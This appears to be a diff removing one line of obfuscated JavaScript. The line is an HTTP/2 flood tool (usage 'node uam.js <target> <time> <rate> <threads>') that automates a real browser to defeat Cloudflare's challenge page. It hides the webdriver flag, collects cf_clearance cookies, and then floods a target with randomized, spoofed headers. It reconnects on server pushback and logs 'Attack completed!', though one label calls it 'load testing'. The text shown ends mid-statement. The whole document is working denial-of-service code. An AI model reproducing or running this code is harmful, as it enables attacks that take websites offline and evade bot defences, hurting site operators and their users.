@@ -1,1 +1,433 @@
-const _0x12ec67=_0x3619;(function(_0x4d56d4,_0x38c58c){const _0x35a00c=_0x3619,_0x517193=_0x4d56d4();while(!![]){try{const _0x5027c0=parseInt(_0x35a00c(0xdb))/0x1*(-parseInt(_0x35a00c(0x157))/0x2)+parseInt(_0x35a00c(0x126))/0x3+parseInt(_0x35a00c(0xcd))/0x4*(parseInt(_0x35a00c(0x115))/0x5)+-parseInt(_0x35a00c(0xd3))/0x6*(parseInt(_0x35a00c(0xe8))/0x7)+-parseInt(_0x35a00c(0x190))/0x8*(-parseInt(_0x35a00c(0x108))/0x9)+parseInt(_0x35a00c(0xec))/0xa+parseInt(_0x35a00c(0x12c))/0xb*(-parseInt(_0x35a00c(0xbd))/0xc);if(_0x5027c0===_0x38c58c)break;else _0x517193['push'](_0x517193['shift']());}catch(_0x1e185e){_0x517193['push'](_0x517193['shift']());}}}(_0x5d32,0x5a1ab));const {connect}=require(_0x12ec67(0x169)),http2=require('http2'),tls=require(_0x12ec67(0x12e)),cluster=require(_0x12ec67(0x160)),url=require(_0x12ec67(0x155)),crypto=require(_0x12ec67(0xee)),defaultCiphers=crypto[_0x12ec67(0x109)][_0x12ec67(0xd1)][_0x12ec67(0x139)](':'),ciphers=_0x12ec67(0x197)+[defaultCiphers[0x2],defaultCiphers[0x1],defaultCiphers[0x0],...defaultCiphers[_0x12ec67(0xd9)](0x3)]['join'](':'),sigalgs=[_0x12ec67(0x11b),_0x12ec67(0x145),'rsa_pkcs1_sha256','ecdsa_secp384r1_sha384',_0x12ec67(0x12b),_0x12ec67(0xfb),_0x12ec67(0x122),_0x12ec67(0x15e)],ecdhCurve=_0x12ec67(0x129),secureOptions=crypto[_0x12ec67(0x109)][_0x12ec67(0x141)]|crypto[_0x12ec67(0x109)][_0x12ec67(0xc5)]|crypto['constants'][_0x12ec67(0x186)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x14c)]|crypto['constants'][_0x12ec67(0x149)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x167)]|crypto['constants'][_0x12ec67(0x184)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x128)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x100)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x10b)]|crypto[_0x12ec67(0x109)][_0x12ec67(0xcc)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x19c)]|crypto[_0x12ec67(0x109)][_0x12ec67(0x177)]|crypto[_0x12ec67(0x109)]['SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION'],secureProtocol=_0x12ec67(0x11e),secureContext=tls[_0x12ec67(0xca)]({'ciphers':ciphers,'sigalgs':sigalgs[_0x12ec67(0xe3)](':'),'honorCipherOrder':!![],'secureOptions':secureOptions,'secureProtocol':secureProtocol}),accept_header=[_0x12ec67(0xe6),'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',_0x12ec67(0xd0),_0x12ec67(0x105)],cache_header=[_0x12ec67(0xd8),_0x12ec67(0x156),'no-cache,\x20no-store,\x20must-revalidate',_0x12ec67(0x18b),_0x12ec67(0xd5)],language_header=[_0x12ec67(0x16a),_0x12ec67(0x19a),_0x12ec67(0x102)];process[_0x12ec67(0x132)][_0x12ec67(0xfe)]<0x6&&(console[_0x12ec67(0xe2)](_0x12ec67(0x103)),console['log'](_0x12ec67(0xe5)),process[_0x12ec67(0x16d)](0x1));const args={'target':process[_0x12ec67(0x132)][0x2],'time':parseInt(process[_0x12ec67(0x132)][0x3]),'Rate':parseInt(process[_0x12ec67(0x132)][0x4]),'threads':parseInt(process[_0x12ec67(0x132)][0x5]),'cookieCount':parseInt(process['argv'][0x6])||0x2},parsedTarget=url['parse'](args['target']);function flood(_0x6946c0,_0x34ecaf){const _0x4fd578=_0x12ec67;try{let _0x566b7e=url[_0x4fd578(0x173)](args[_0x4fd578(0x18e)]),_0x37e83d=_0x566b7e[_0x4fd578(0x120)];function _0x383ae8(_0xb06d89,_0x933a52){const _0x22a9f7=_0x4fd578;return Math['floor'](Math[_0x22a9f7(0xfc)]()*(_0x933a52-_0xb06d89+0x1))+_0xb06d89;}let _0x767f22=_0x383ae8(0x64,0x3e8);function _0x193247(_0xe68132){const _0x2cc6a7=_0x4fd578,_0x55d9d8=/Chrome\/([\d.]+)/,_0x28afa4=_0xe68132[_0x2cc6a7(0x116)](_0x55d9d8);if(_0x28afa4&&_0x28afa4[0x1])return _0x28afa4[0x1];return null;}const _0x23fbdb=_0x193247(_0x6946c0)||_0x4fd578(0xb6),_0x4bfaca=_0x223930=>_0x223930[Math[_0x4fd578(0x107)](Math[_0x4fd578(0xfc)]()*_0x223930[_0x4fd578(0xfe)])],_0x1788c9=[_0x4fd578(0x16a),'en-GB,en;q=0.9',_0x4fd578(0x127),_0x4fd578(0x150),'es-ES,es;q=0.9','it-IT,it;q=0.9',_0x4fd578(0xb2),'ja-JP,ja;q=0.9',_0x4fd578(0x17d),_0x4fd578(0x148),'ru-RU,ru;q=0.9',_0x4fd578(0x130),_0x4fd578(0x11f),_0x4fd578(0x114),_0x4fd578(0x193),_0x4fd578(0x183),_0x4fd578(0x179),_0x4fd578(0x13d),_0x4fd578(0x18c),'da-DK,da;q=0.9','fi-FI,fi;q=0.9',_0x4fd578(0x11a),_0x4fd578(0x14e),_0x4fd578(0xf6),_0x4fd578(0x137),_0x4fd578(0x18f),'th-TH,th;q=0.9',_0x4fd578(0x10d),_0x4fd578(0x16c),_0x4fd578(0xe0)];let _0x34be06={':method':_0x4fd578(0x142),':authority':_0x566b7e[_0x4fd578(0x133)],':scheme':_0x4fd578(0x134),':path':_0x37e83d,'user-agent':_0x6946c0,'upgrade-insecure-requests':'1','sec-fetch-site':_0x4fd578(0xdd),'sec-fetch-mode':_0x4fd578(0x199),'sec-fetch-user':'?1','sec-fetch-dest':_0x4fd578(0xfd),'cookie':_0x34ecaf,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','sec-ch-ua':_0x4fd578(0xc3)+_0x23fbdb+_0x4fd578(0x170)+_0x23fbdb+'\x22','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'Windows','accept-encoding':_0x4fd578(0x111),...shuffleObject({'accept-language':_0x4bfaca(_0x1788c9)+',fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','purpure-secretf-id':_0x4fd578(0x146)+generateRandomString(0x1,0x2)}),'priority':_0x4fd578(0x135),'te':_0x4fd578(0x140)},_0x58aa42={...Math[_0x4fd578(0xfc)]()<0.3?{'purpure-secretf-id':_0x4fd578(0x146)+generateRandomString(0x1,0x2)}:{},...Math['random']()<0.5?{'sec-stake-fommunity':_0x4fd578(0x10a)}:{},...Math['random']()<0.6?{[generateRandomString(0x1,0x2)+_0x4fd578(0xf3)+generateRandomString(0x1,0x2)]:_0x4fd578(0x14a)+generateRandomString(0x1,0x2)}:{},...Math[_0x4fd578(0xfc)]()<0.6?{['stringclick-bad-'+generateRandomString(0x1,0x2)]:_0x4fd578(0x113)+generateRandomString(0x1,0x2)}:{},...Math[_0x4fd578(0xfc)]()<0.6?{['root-user'+generateRandomString(0x1,0x2)]:_0x4fd578(0xe9)+generateRandomString(0x1,0x2)}:{},...Math[_0x4fd578(0xfc)]()<0.6?{['Java-x-seft'+generateRandomString(0x1,0x2)]:_0x4fd578(0x14a)+generateRandomString(0x1,0x2)}:{},...Math[_0x4fd578(0xfc)]()<0.6?{[_0x4fd578(0xc1)+generateRandomString(0x1,0x2)]:_0x4fd578(0x113)+generateRandomString(0x1,0x2)}:{},...Math[_0x4fd578(0xfc)]()<0.3?{[generateRandomString(0x1,0x2)+_0x4fd578(0xb1)+generateRandomString(0x1,0x2)]:_0x4fd578(0x14a)+generateRandomString(0x1,0x2)}:{},...Math[_0x4fd578(0xfc)]()<0.3?{[_0x4fd578(0x15b)+generateRandomString(0x1,0x2)]:_0x4fd578(0x113)+generateRandomString(0x1,0x2)}:{}},_0x2e410c=[_0x4fd578(0x17f),_0x4fd578(0x106),'sec-ch-ua-platform',_0x4fd578(0xf4),_0x4fd578(0xfa),_0x4fd578(0x171),_0x4fd578(0x131),_0x4fd578(0x187),_0x4fd578(0x13b)],_0x4452e6=Object['entries'](_0x34be06),_0x193a73=Object[_0x4fd578(0xbe)](_0x58aa42)[_0x4fd578(0x12d)](()=>Math[_0x4fd578(0xfc)]()-0.5);_0x193a73[_0x4fd578(0x15f)](([_0x31f10a,_0x1dcbb6])=>{const _0x4ca90f=_0x4fd578;let _0x32e8d6=_0x2e410c[Math[_0x4ca90f(0x107)](Math['random']()*_0x2e410c[_0x4ca90f(0xfe)])],_0x539cf7=_0x4452e6['findIndex'](([_0x5bca06,_0x6d54ba])=>_0x5bca06===_0x32e8d6);_0x539cf7!==-0x1&&_0x4452e6[_0x4ca90f(0x175)](_0x539cf7+0x1,0x0,[_0x31f10a,_0x1dcbb6]);});let _0x5186d2=Object[_0x4fd578(0x16b)](_0x4452e6);const _0x36d68a=[crypto[_0x4fd578(0x109)][_0x4fd578(0xb4)],crypto[_0x4fd578(0x109)][_0x4fd578(0x110)],crypto[_0x4fd578(0x109)][_0x4fd578(0x141)],crypto[_0x4fd578(0x109)][_0x4fd578(0xc5)],crypto['constants'][_0x4fd578(0xbf)],crypto['constants'][_0x4fd578(0x167)],crypto[_0x4fd578(0x109)][_0x4fd578(0x153)],crypto[_0x4fd578(0x109)][_0x4fd578(0x147)]];function _0xbe970c(_0x2cdb5e){const _0x4469b7=_0x4fd578,_0x4b582c=tls[_0x4469b7(0xf0)]({'host':_0x2cdb5e['host'],'port':0x1bb,'servername':_0x2cdb5e[_0x4469b7(0x133)],'minVersion':_0x4469b7(0x101),'maxVersion':_0x4469b7(0x143),'ALPNProtocols':['h2'],'rejectUnauthorized':![],'sigalgs':_0x4469b7(0x196),'ecdhCurve':'X25519:P-256:P-384',...Math[_0x4469b7(0xfc)]()<0.5?{'secureOptions':_0x36d68a[Math[_0x4469b7(0x107)](Math[_0x4469b7(0xfc)]()*_0x36d68a['length'])]}:{}});return _0x4b582c[_0x4469b7(0xbc)](!![],0x927c0*0x3e8),_0x4b582c;}const _0x516ed3=_0xbe970c(_0x566b7e),_0x3aa7e5=http2[_0x4fd578(0xf0)](_0x566b7e['href'],{'createConnection':()=>_0x516ed3,'settings':{'headerTableSize':0x10000,'enablePush':![],'initialWindowSize':0x600000,'NO_RFC7540_PRIORITIES':Math[_0x4fd578(0xfc)]()<0.5?!![]:'1'}},_0x51cbee=>{const _0x3c6d0f=_0x4fd578;_0x51cbee[_0x3c6d0f(0x151)](0xbf0001+0xffff);});_0x3aa7e5['on']('connect',()=>{const _0x433286=_0x4fd578;let _0x356902=setInterval(async()=>{const _0x49e2b3=_0x3619;for(let _0x1a5764=0x0;_0x1a5764<args[_0x49e2b3(0x117)];_0x1a5764++){const _0x1981d3=_0x3aa7e5['request']({..._0x5186d2},{'weight':Math['random']()<0.5?0x2a:0x100,'depends_on':0x0,'exclusive':![]});_0x1981d3['on'](_0x49e2b3(0x15c),_0x5b8a82=>{const _0x97c55c=_0x49e2b3;global[_0x97c55c(0x13f)]=(global[_0x97c55c(0x13f)]||0x0)+0x1,global[_0x97c55c(0x185)]=(global[_0x97c55c(0x185)]||0x0)+0x1,_0x5b8a82[':status']===0x1ad&&(_0x767f22=0x4e20,_0x3aa7e5[_0x97c55c(0x161)]());}),_0x1981d3[_0x49e2b3(0x162)]();}},_0x767f22),_0x233340=0x0;_0x3aa7e5['on']('goaway',(_0x4c313b,_0x2d6331,_0x715246)=>{const _0x5a53f9=_0x3619;let _0x455ec9=Math['min'](0x3e8*Math[_0x5a53f9(0x192)](0x2,_0x233340),0x3a98);setTimeout(()=>{_0x233340++,_0x3aa7e5['destroy'](),_0x516ed3['destroy'](),flood(_0x6946c0,_0x34ecaf);},_0x455ec9);}),_0x3aa7e5['on'](_0x433286(0x161),()=>{const _0x285415=_0x433286;return clearInterval(_0x356902),_0x3aa7e5[_0x285415(0x19e)](),_0x516ed3[_0x285415(0x19e)](),flood(_0x6946c0,_0x34ecaf);}),_0x3aa7e5['on'](_0x433286(0x13a),_0x24922a=>{const _0x24e07b=_0x433286;return _0x3aa7e5[_0x24e07b(0x19e)](),_0x516ed3[_0x24e07b(0x19e)](),flood(_0x6946c0,_0x34ecaf);});}),_0x3aa7e5['on'](_0x4fd578(0x13a),_0x37f683=>{const _0x448902=_0x4fd578;_0x3aa7e5[_0x448902(0x19e)](),_0x516ed3[_0x448902(0x19e)]();});}catch(_0x39e779){console[_0x4fd578(0xe2)](_0x4fd578(0x14f)+_0x39e779[_0x4fd578(0xf7)]);}}function randomElement(_0x122fd5){const _0x2b6099=_0x12ec67;return _0x122fd5[Math[_0x2b6099(0x107)](Math[_0x2b6099(0xfc)]()*_0x122fd5[_0x2b6099(0xfe)])];}function randstr(_0x1546a1){const _0x40745c=_0x12ec67,_0x4e9eb6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let _0x1f48e9='';for(let _0x3e3185=0x0;_0x3e3185<_0x1546a1;_0x3e3185++){_0x1f48e9+=_0x4e9eb6[Math[_0x40745c(0x107)](Math[_0x40745c(0xfc)]()*_0x4e9eb6[_0x40745c(0xfe)])];}return _0x1f48e9;}function generateRandomString(_0x3a1954,_0x3864e7){const _0x14b77e=_0x12ec67,_0x33c076=_0x14b77e(0xba),_0x1cc2bf=Math[_0x14b77e(0x107)](Math[_0x14b77e(0xfc)]()*(_0x3864e7-_0x3a1954+0x1))+_0x3a1954,_0x2f5b2f=Array['from']({'length':_0x1cc2bf},()=>{const _0x2fc273=_0x14b77e,_0x57bd70=Math['floor'](Math[_0x2fc273(0xfc)]()*_0x33c076[_0x2fc273(0xfe)]);return _0x33c076[_0x57bd70];});return _0x2f5b2f[_0x14b77e(0xe3)]('');}function shuffleObject(_0x21ef62){const _0x5ad351=_0x12ec67,_0x5c1b0e=Object[_0x5ad351(0x13c)](_0x21ef62),_0x239d66=_0x5c1b0e[_0x5ad351(0xeb)]((_0x18e6ec,_0x521609,_0x1d62e9,_0x1ef567)=>{const _0x1ad22e=_0x5ad351,_0x49bcde=Math['floor'](Math[_0x1ad22e(0xfc)]()*(_0x1d62e9+0x1));return _0x18e6ec[_0x1d62e9]=_0x18e6ec[_0x49bcde],_0x18e6ec[_0x49bcde]=_0x5c1b0e[_0x1d62e9],_0x18e6ec;},[]),_0x53733d=Object[_0x5ad351(0x16b)](_0x239d66['map'](_0x5b54fd=>[_0x5b54fd,_0x21ef62[_0x5b54fd]]));return _0x53733d;}async function bypassCloudflareOnce(_0x18cbb8=0x1){const _0x1a4725=_0x12ec67;let _0x3a895d=null,_0xbea08d=null,_0x491839=null;try{console['log'](_0x1a4725(0xef)+_0x18cbb8+'...\x1b[0m'),_0x3a895d=await connect({'headless':![],'args':[_0x1a4725(0x191),_0x1a4725(0xcf),_0x1a4725(0x11c),'--disable-accelerated-2d-canvas',_0x1a4725(0x19d),_0x1a4725(0x10e),'--disable-gpu','--window-size=1920,1080'],'turnstile':!![],'connectOption':{'defaultViewport':null}}),_0xbea08d=_0x3a895d[_0x1a4725(0xce)],_0x491839=_0x3a895d[_0x1a4725(0x13e)],await _0x491839['evaluateOnNewDocument'](()=>{const _0x38e5a5=_0x1a4725;Object['defineProperty'](navigator,_0x38e5a5(0x138),{'get':()=>undefined});}),console[_0x1a4725(0xe2)](_0x1a4725(0x124)+args[_0x1a4725(0x18e)]+_0x1a4725(0xde));try{await _0x491839[_0x1a4725(0xc4)](args[_0x1a4725(0x18e)],{'waitUntil':_0x1a4725(0x182),'timeout':0xea60});}catch(_0x7f4d13){console[_0x1a4725(0xe2)](_0x1a4725(0xb5)+_0x7f4d13[_0x1a4725(0xf7)]+_0x1a4725(0xc7));}console[_0x1a4725(0xe2)]('\x1b[33mChecking\x20Cloudflare\x20challenge...\x1b[0m');let _0x46009f=![],_0x275199=0x0;const _0x55b5cb=0x78;while(!_0x46009f&&_0x275199<_0x55b5cb){await new Promise(_0x12c445=>setTimeout(_0x12c445,0x1f4));try{const _0x3d7a68=await _0x491839['cookies'](),_0x33bfdc=_0x3d7a68[_0x1a4725(0xe4)](_0x37803c=>_0x37803c[_0x1a4725(0x165)]===_0x1a4725(0xf5));if(_0x33bfdc){console['log']('\x1b[32mFound\x20cookie\x20after\x20'+(_0x275199*0.5)[_0x1a4725(0x158)](0x1)+_0x1a4725(0x112)),_0x46009f=!![];break;}_0x46009f=await _0x491839['evaluate'](()=>{const _0x44dca5=_0x1a4725,_0x4b8bdf=(document[_0x44dca5(0x19b)]||'')[_0x44dca5(0xb3)](),_0x2deec7=(document[_0x44dca5(0xc8)]?.['innerText']||'')['toLowerCase']();if(_0x4b8bdf[_0x44dca5(0xbb)]('just\x20a\x20moment')||_0x4b8bdf['includes'](_0x44dca5(0x118))||_0x2deec7[_0x44dca5(0xbb)](_0x44dca5(0x136))||_0x2deec7[_0x44dca5(0xbb)](_0x44dca5(0x180))||_0x2deec7[_0x44dca5(0xbb)]('cloudflare'))return![];return document[_0x44dca5(0xc8)]&&document[_0x44dca5(0xc8)]['children'][_0x44dca5(0xfe)]>0x3;});}catch(_0x266baf){}_0x275199++,_0x275199%0xa===0x0&&console[_0x1a4725(0xe2)]('\x1b[33mStill\x20checking...\x20('+(_0x275199*0.5)[_0x1a4725(0x158)](0x1)+_0x1a4725(0xb8));}await new Promise(_0x4760a4=>setTimeout(_0x4760a4,0x3e8));const _0x5031ea=await _0x491839[_0x1a4725(0x144)]();console[_0x1a4725(0xe2)](_0x1a4725(0x172)+_0x5031ea[_0x1a4725(0xfe)]+_0x1a4725(0x12a)+(_0x275199*0.5)['toFixed'](0x1)+_0x1a4725(0xd7));const _0x56a13f=_0x5031ea[_0x1a4725(0xe4)](_0x57684f=>_0x57684f[_0x1a4725(0x165)]===_0x1a4725(0xf5));_0x56a13f&&console[_0x1a4725(0xe2)](_0x1a4725(0xe7)+_0x56a13f['value'][_0x1a4725(0x176)](0x0,0x1e)+_0x1a4725(0xde));const _0x5d2567=await _0x491839[_0x1a4725(0x15a)](()=>navigator['userAgent']);return await _0x491839[_0x1a4725(0x161)](),await _0xbea08d[_0x1a4725(0x161)](),{'cookies':_0x5031ea,'userAgent':_0x5d2567,'cfClearance':_0x56a13f?_0x56a13f[_0x1a4725(0x121)]:null,'success':!![],'attemptNum':_0x18cbb8};}catch(_0x1ca2a7){console[_0x1a4725(0xe2)]('\x1b[31mBypass\x20attempt\x20'+_0x18cbb8+_0x1a4725(0xcb)+_0x1ca2a7['message']+_0x1a4725(0xc7));try{if(_0x491839)await _0x491839['close']();if(_0xbea08d)await _0xbea08d[_0x1a4725(0x161)]();}catch(_0x1553bd){}return{'cookies':[],'userAgent':'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/120.0.0.0\x20Safari/537.36','cfClearance':null,'success':![],'attemptNum':_0x18cbb8};}}function _0x5d32(){const _0x5aceb1=['accept-encoding','argv','host','https','u=0,\x20i','checking\x20your\x20browser','el-GR,el;q=0.9','webdriver','split','error','priority','keys','sv-SE,sv;q=0.9','page','successRequests','trailers','SSL_OP_NO_SSLv2','GET','TLSv1.3','cookies','rsa_pss_rsae_sha256','formula-','SSL_OP_ALL','ko-KR,ko;q=0.9','ALPN_ENABLED','zero-','userAgent','SSL_OP_NO_TLSv1_1','\x1b[36mTarget\x20cookie\x20count:\x20','cs-CZ,cs;q=0.9','Error\x20in\x20flood\x20function:\x20','de-DE,de;q=0.9','setLocalWindowSize','failed','SSL_OP_TLSEXT_PADDING','\x0a\x1b[33mStarting\x20parallel\x20batch\x20(','url','max-age=0','892vLiSHG','toFixed','\x1b[35mCLOUDFLARE\x20BYPASS\x20-\x20PARALLEL\x20MODE\x1b[0m','evaluate','sys-nodejs-','response','\x20\x20\x20Success:\x20','rsa_pkcs1_sha512','forEach','cluster','close','end','threads','\x20\x20\x20\x1b[32mSuccess:\x1b[0m\x20','name','bypassData','SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION','min','puppeteer-real-browser','en-US,en;q=0.9','fromEntries','he-IL,he;q=0.9','exit','data','failedRequests','\x22,\x20\x22Not)A;Brand\x22;v=\x228\x22,\x20\x22Chrome\x22;v=\x22','sec-ch-ua-mobile','\x1b[36mFound\x20','parse','\x20\x20\x20\x1b[31mFailed:\x1b[0m\x20','splice','substring','SSL_OP_SINGLE_ECDH_USE','\x20sessions)...\x1b[0m','nl-NL,nl;q=0.9','success','attemptNum','repeat','zh-CN,zh;q=0.9','map','accept-language','please\x20wait','\x1b[36mFinal\x20statistics:\x1b[0m','domcontentloaded','id-ID,id;q=0.9','SSL_OP_CIPHER_SERVER_PREFERENCE','totalRequests','SSL_OP_NO_TLSv1','purpure-secretf-id','\x20\x20\x20\x1b[36mTotal:\x1b[0m\x20','\x20failed\x1b[0m','type','no-store','no-NO,no;q=0.9','\x20required','target','pt-PT,pt;q=0.9','8UFWaxl','--no-sandbox','pow','tr-TR,tr;q=0.9','max','\x20/\x20','ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256','GREASE:',')\x1b[0m','navigate','vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7','title','SSL_OP_SINGLE_DH_USE','--no-first-run','destroy','-C-Boost-','pt-BR,pt;q=0.9','toLowerCase','SSL_OP_NO_RENEGOTIATION','\x1b[33mAccess\x20warning:\x20','126','\x1b[31mSession\x20','s\x20elapsed)\x1b[0m','\x1b[35mADVANCED\x20LOAD\x20TESTING\x1b[0m','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','includes','setKeepAlive','12FITyKR','entries','SSL_OP_NO_COMPRESSION','\x0a\x1b[32mAttack\x20completed!\x1b[0m','HTTP-requests-with-unusual-HTTP-headers-or-URI-path-','cookieCount','\x22Chromium\x22;v=\x22','goto','SSL_OP_NO_SSLv3','time','\x1b[0m','body','stats','createSecureContext','\x20failed:\x20','SSL_OP_PKCS1_CHECK_2','251708fxKgXS','browser','--disable-setuid-sandbox','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','defaultCoreCipherList','push','390702ePBAqX','clear','no-cache,\x20no-store,\x20private,\x20max-age=0','\x1b[33mStatistics:\x1b[0m','s\x1b[0m','no-cache','slice','\x20req/s','1577JJSXLU','\x1b[36mConfiguration:\x1b[0m\x20Rate:\x20','same-origin','...\x1b[0m','\x1b[32mSession\x20','fa-IR,fa;q=0.9','unhandledRejection','log','join','find','\x1b[33mExample:\x20node\x20uam.js\x20https://example.com\x2060\x205\x204\x206\x1b[0m','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','\x1b[32mcf_clearance:\x20','7pzdKmM','root-','now','reduce','5748340dyZcex','\x1b[36mSessions:\x1b[0m\x20','crypto','\x1b[33mStarting\x20bypass\x20attempt\x20','connect','fork','\x1b[36mTarget:\x1b[0m\x20','-SElF-DYNAMIC-','accept','cf_clearance','hu-HU,hu;q=0.9','message','\x0a\x1b[32mTotal\x20sessions\x20obtained:\x20','startTime','sec-ch-ua','rsa_pkcs1_sha384','random','document','length','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/120.0.0.0\x20Safari/537.36','SSL_OP_COOKIE_EXCHANGE','TLSv1.2','en-GB,en;q=0.9','\x1b[31mUsage:\x20node\x20uam.js\x20<target>\x20<time>\x20<rate>\x20<threads>\x20<cookieCount>\x1b[0m','\x1b[36mRemaining:\x1b[0m\x20','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','sec-fetch-user','floor','1501110dDtcYp','constants','bet-clc','SSL_OP_PKCS1_CHECK_1','\x20\x20\x20Failed:\x20','vi-VN,vi;q=0.9','--no-zygote','\x20sessions!\x1b[0m','SSL_OP_NO_TICKET','gzip,\x20deflate,\x20br,\x20zstd','s!\x1b[0m','router-','ur-PK,ur;q=0.9','35nuMwvF','match','Rate','checking','\x20\x20\x20Sessions\x20used:\x20','pl-PL,pl;q=0.9','ecdsa_secp256r1_sha256','--disable-dev-shm-usage','\x1b[32mStarting\x20attack...\x1b[0m\x0a','TLS_method','hi-IN,hi;q=0.9','path','value','rsa_pss_rsae_sha512','\x0a\x1b[36mProgress:\x20[','\x1b[33mAccessing\x20','\x1b[36mTime:\x1b[0m\x20','1722096thevfp','fr-FR,fr;q=0.9','SSL_OP_LEGACY_SERVER_CONNECT','GREASE:X25519:x25519:P-256:P-384:P-521:X448','\x20cookies\x20in\x20','rsa_pss_rsae_sha384','6804809fvwVKK','sort','tls','send','ar-SA,ar;q=0.9'];_0x5d32=function(){return _0x5aceb1;};return _0x5d32();}function _0x3619(_0x2adff5,_0x288bcf){_0x2adff5=_0x2adff5-0xb1;const _0x5d32e4=_0x5d32();let _0x3619d7=_0x5d32e4[_0x2adff5];return _0x3619d7;}async function bypassCloudflareParallel(_0x36b1cb){const _0x5043f6=_0x12ec67;console[_0x5043f6(0xe2)](_0x5043f6(0x159)),console['log'](_0x5043f6(0x14d)+_0x36b1cb+'\x1b[0m');const _0x45d33a=[];let _0x3b3c8b=0x0;const _0x3aca30=0x2;while(_0x45d33a[_0x5043f6(0xfe)]<_0x36b1cb){const _0x3d316e=0xa,_0x3b12c8=_0x36b1cb-_0x45d33a['length'],_0x34d31=Math[_0x5043f6(0x168)](_0x3d316e,_0x3b12c8);console['log'](_0x5043f6(0x154)+_0x34d31+_0x5043f6(0x178));const _0x20e174=[];for(let _0x20b556=0x0;_0x20b556<_0x34d31;_0x20b556++){_0x3b3c8b++,_0x20e174[_0x5043f6(0xd2)](bypassCloudflareOnce(_0x3b3c8b));}const _0x2e7120=await Promise['all'](_0x20e174);for(const _0x894e54 of _0x2e7120){_0x894e54[_0x5043f6(0x17a)]&&_0x894e54[_0x5043f6(0x144)][_0x5043f6(0xfe)]>0x0?(_0x45d33a[_0x5043f6(0xd2)](_0x894e54),console['log'](_0x5043f6(0xdf)+_0x894e54[_0x5043f6(0x17b)]+'\x20successful!\x20(Total:\x20'+_0x45d33a[_0x5043f6(0xfe)]+'/'+_0x36b1cb+_0x5043f6(0x198))):console['log'](_0x5043f6(0xb7)+_0x894e54[_0x5043f6(0x17b)]+_0x5043f6(0x189));}_0x45d33a[_0x5043f6(0xfe)]<_0x36b1cb&&(console[_0x5043f6(0xe2)]('\x1b[33mWaiting\x202s\x20before\x20next\x20batch...\x1b[0m'),await new Promise(_0x5447ae=>setTimeout(_0x5447ae,0x7d0)));}return _0x45d33a[_0x5043f6(0xfe)]===0x0&&(console[_0x5043f6(0xe2)]('\x1b[33mNo\x20Cloudflare\x20cookies\x20obtained,\x20using\x20default\x20header\x1b[0m'),_0x45d33a['push']({'cookies':[],'userAgent':_0x5043f6(0xff),'cfClearance':null,'success':!![]})),console[_0x5043f6(0xe2)](_0x5043f6(0xf8)+_0x45d33a[_0x5043f6(0xfe)]+_0x5043f6(0xc7)),_0x45d33a;}function runFlooder(){const _0x1bb0cc=_0x12ec67,_0x3fd726=randomElement(global[_0x1bb0cc(0x166)]||[]);if(!_0x3fd726)return;const _0x1ee5ea=_0x3fd726['cookies']?_0x3fd726[_0x1bb0cc(0x144)][_0x1bb0cc(0x17e)](_0x1d2dc9=>_0x1d2dc9['name']+'='+_0x1d2dc9[_0x1bb0cc(0x121)])[_0x1bb0cc(0xe3)](';\x20'):'',_0xbb6c9=_0x3fd726[_0x1bb0cc(0x14b)]||'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36';flood(_0xbb6c9,_0x1ee5ea);}function displayStats(){const _0x566415=_0x12ec67,_0x368abb=Math[_0x566415(0x107)]((Date[_0x566415(0xea)]()-global[_0x566415(0xf9)])/0x3e8),_0x362a72=Math[_0x566415(0x194)](0x0,args[_0x566415(0xc6)]-_0x368abb);console['clear'](),console[_0x566415(0xe2)](_0x566415(0xb9)),console[_0x566415(0xe2)](_0x566415(0xf2)+args['target']),console[_0x566415(0xe2)](_0x566415(0x125)+_0x368abb+'s\x20/\x20'+args[_0x566415(0xc6)]+'s'),console[_0x566415(0xe2)](_0x566415(0x104)+_0x362a72+'s'),console[_0x566415(0xe2)](_0x566415(0xdc)+args[_0x566415(0x117)]+'/s\x20|\x20Threads:\x20'+args[_0x566415(0x163)]),console[_0x566415(0xe2)](_0x566415(0xed)+(global[_0x566415(0x166)]?global[_0x566415(0x166)][_0x566415(0xfe)]:0x0)+_0x566415(0x195)+args[_0x566415(0xc2)]+_0x566415(0x18d)),console[_0x566415(0xe2)](_0x566415(0xd6)),console[_0x566415(0xe2)](_0x566415(0x164)+(global['successRequests']||0x0)),console[_0x566415(0xe2)](_0x566415(0x174)+(global[_0x566415(0x16f)]||0x0)),console['log'](_0x566415(0x188)+(global[_0x566415(0x185)]||0x0)),console[_0x566415(0xe2)]('\x20\x20\x20\x1b[33mSpeed:\x1b[0m\x20'+(_0x368abb>0x0?((global['totalRequests']||0x0)/_0x368abb)['toFixed'](0x2):0x0)+_0x566415(0xda));const _0x1b7829=global['totalRequests']||0x0,_0x108253=global[_0x566415(0x13f)]||0x0;console['log']('\x20\x20\x20\x1b[32mSuccess\x20rate:\x1b[0m\x20'+(_0x1b7829>0x0?(_0x108253/_0x1b7829*0x64)['toFixed'](0x2):0x0)+'%');if(_0x362a72>0x0){const 